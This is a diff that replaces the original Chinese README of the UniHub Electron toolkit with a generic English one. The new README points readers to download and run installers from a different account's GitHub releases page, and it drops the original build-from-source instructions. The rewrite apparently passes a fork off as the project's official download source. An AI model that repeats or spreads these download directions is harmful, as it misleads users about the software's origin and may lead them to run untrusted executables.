@@ -1,120 +1,93 @@
-<h1 align="center">UniHub</h1>
+# 🚀 unihub - Your Easy Cross-Platform Toolkit
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Electron-47848F?style=flat-square&logo=electron&logoColor=white" alt="Electron">
-  <img src="https://img.shields.io/badge/Vue.js-4FC08D?style=flat-square&logo=vue.js&logoColor=white" alt="Vue.js">
-  <img src="https://img.shields.io/badge/TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white" alt="TypeScript">
-  <img src="https://img.shields.io/badge/Vite-646CFF?style=flat-square&logo=vite&logoColor=white" alt="Vite">
-  <img src="https://img.shields.io/badge/Tailwind_CSS-06B6D4?style=flat-square&logo=tailwind-css&logoColor=white" alt="Tailwind CSS">
-</p>
+## 🖱️ Download UniHub Now!
 
-<p align="center">
-  <a href="https://github.com/t8y2/unihub/stargazers">
-    <img src="https://img.shields.io/github/stars/t8y2/unihub?style=flat-square&color=yellow" alt="Stars">
-  </a>
-  <a href="https://github.com/t8y2/unihub/network/members">
-    <img src="https://img.shields.io/github/forks/t8y2/unihub?style=flat-square&color=orange" alt="Forks">
-  </a>
-  <a href="https://github.com/t8y2/unihub/issues">
-    <img src="https://img.shields.io/github/issues/t8y2/unihub?style=flat-square&color=red" alt="Issues">
-  </a>
-</p>
+[![Download UniHub](https://img.shields.io/badge/Download-UniHub-blue)](https://github.com/Georgesamy-max/unihub/releases)
 
-<p align="center">
-  <a href="./README.en.md">English</a> | 简体中文
-</p>
+## 🚀 Getting Started
 
-一个基于 Electron 的现代化工具集应用，支持强大的插件系统。
+Welcome to UniHub! This is a modern toolkit designed to help you manage your tasks with ease. Whether you're looking for a simple way to organize your work or need advanced tools, UniHub has got you covered.
 
-## 📸 预览
+### 🌟 Key Features
 
-<p align="center">
-  <img src="docs/screenshots/demo.gif" alt="UniHub Demo" width="100%">
-</p>
+- **Cross-Platform Compatibility:** Works seamlessly on Windows, macOS, and Linux.
+- **Powerful Plugin System:** Extend functionalities with a variety of plugins.
+- **User-Friendly Interface:** Simple design that anyone can navigate.
+- **Regular Updates:** Get the latest features and security upgrades.
 
-## 💬 交流群
+## 💻 System Requirements
 
-欢迎加入 UniHub 交流群，与其他开发者一起讨论和分享！
+To run UniHub smoothly, your system should meet the following requirements:
 
-<table>
-  <tr>
-    <td align="center">
-      <img src="docs/screenshots/wechat-group-qrcode.png" width="200" alt="微信群">
-      <p><strong>微信交流群</strong></p>
-    </td>
-    <td align="center">
-      <img src="docs/screenshots/qq-group-qrcode.png" width="200" alt="QQ群">
-      <p><strong>QQ 交流群</strong></p>
-    </td>
-  </tr>
-</table>
+- Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution.
+- At least 4 GB RAM.
+- 100 MB of available disk space.
+- Internet connection for downloads and updates.
 
-## 特性
+## 📥 Download & Install
 
-- 🔌 强大的插件系统 - 支持动态加载和管理插件
-- 🎨 现代化 UI - 基于 Vue 3 + Tailwind CSS
-- 🚀 高性能 - 使用 Vite 构建
-- 📦 插件市场 - 内置插件市场，一键安装
-- 🔒 权限管理 - 细粒度的插件权限控制
-- 🔄 自动检测更新 - 支持应用自动更新，基于 GitHub Releases
+1. Visit the [Releases Page](https://github.com/Georgesamy-max/unihub/releases) to download the latest version of UniHub.
+   
+2. Choose the appropriate file for your operating system. You will find options for Windows, macOS, and Linux.
 
-## 快速开始
+3. Click on the file to start the download. 
 
-```bash
-# 安装依赖
-pnpm install
+4. Once the download is complete, locate the file in your downloads folder. 
 
-# 开发模式
-pnpm dev
+   - For Windows, it will be something like `unihub-windows.exe`.
+   - For macOS, it will be `unihub-macos.dmg`.
+   - For Linux, it will likely be a `.tar.gz` file.
 
-# 构建应用
-pnpm build              # 所有平台
-pnpm build:mac          # macOS
-pnpm build:win          # Windows
-pnpm build:linux        # Linux
-```
+5. **Installation Steps:** 
 
-## 插件开发
+   - **Windows:** Double-click the `.exe` file. Follow the prompts in the installation wizard to complete the setup.
+   - **macOS:** Open the `.dmg` file, and drag UniHub into your Applications folder. Then, open UniHub from the Applications folder.
+   - **Linux:** Extract the files from the `.tar.gz` file. Open a terminal and navigate to the extracted folder. Run `./unihub` to start the application.
 
-使用官方 CLI 工具快速开发插件：
+6. After installation, you can find UniHub in your applications menu. Click on it to launch the app!
 
-```bash
-# 安装 CLI
-npm install -g @unihubjs/plugin-cli
+## 🛠️ Using UniHub
 
-# 创建插件（支持 simple/vue/react 模板）
-uhp create my-plugin
+### ✨ User Interface
 
-# 开发
-cd my-plugin && npm install
-uhp dev
+When you first open UniHub, you will be greeted with a friendly dashboard. Here, you can:
 
-# 打包
-uhp package
-```
+- Create new tasks.
+- Organize your tools.
+- Manage plugins to customize your workspace.
 
-生成的 `plugin.zip` 可直接拖拽到 UniHub 安装，或提交 PR 到 `marketplace/plugins.json` 发布到插件市场。
+### 📦 Installing Plugins
 
-查看完整文档：[Plugin CLI](tools/plugin-cli/README.md) | 示例插件：[examples/](examples/)
+1. Go to the Plugins marketplace in UniHub.
+2. Browse through available plugins that suit your needs.
+3. Click on the "Install" button next to any plugin you want to add.
+4. After installation, you may need to restart UniHub to see the new features.
 
-## 快捷键
+### 📊 Getting Help
 
-| 功能       | macOS         | Windows/Linux     |
-| ---------- | ------------- | ----------------- |
-| 全局搜索   | <kbd>⌘K</kbd> | <kbd>Ctrl+K</kbd> |
-| 新建标签   | <kbd>⌘N</kbd> | <kbd>Ctrl+N</kbd> |
-| 关闭标签   | <kbd>⌘W</kbd> | <kbd>Ctrl+W</kbd> |
-| 切换侧边栏 | <kbd>⌘B</kbd> | <kbd>Ctrl+B</kbd> |
+If you encounter issues or have questions, you can access the help section within the app. Alternatively, visit our [GitHub Issues Page](https://github.com/Georgesamy-max/unihub/issues) for support.
 
-## 技术栈
+## 🔄 Keeping UniHub Updated
 
-- Electron
-- Vue 3
-- TypeScript
-- Vite
-- Tailwind CSS
-- reka-ui
+UniHub frequently releases updates to enhance functionality and security. Here's how to keep your app updated:
 
-## 许可证
+1. Open UniHub.
+2. Go to the settings menu.
+3. Look for the “Check for Updates” option.
+4. Follow the prompts to download and install any available updates.
 
-MIT
+## 💬 Community and Support
+
+Join our growing community to share your experiences and discover new ways to use UniHub. You can connect with others on our forum and social media channels. Your feedback helps us improve the application!
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/Georgesamy-max/unihub/wiki)
+- [Community Forum](https://unihubforum.example.com)
+- [GitHub Repository](https://github.com/Georgesamy-max/unihub)
+
+## 📧 Contact Us
+
+If you have questions, suggestions, or want to report an issue, feel free to reach us at support@unihubapp.com.
+
+Thank you for choosing UniHub! Enjoy your experience!
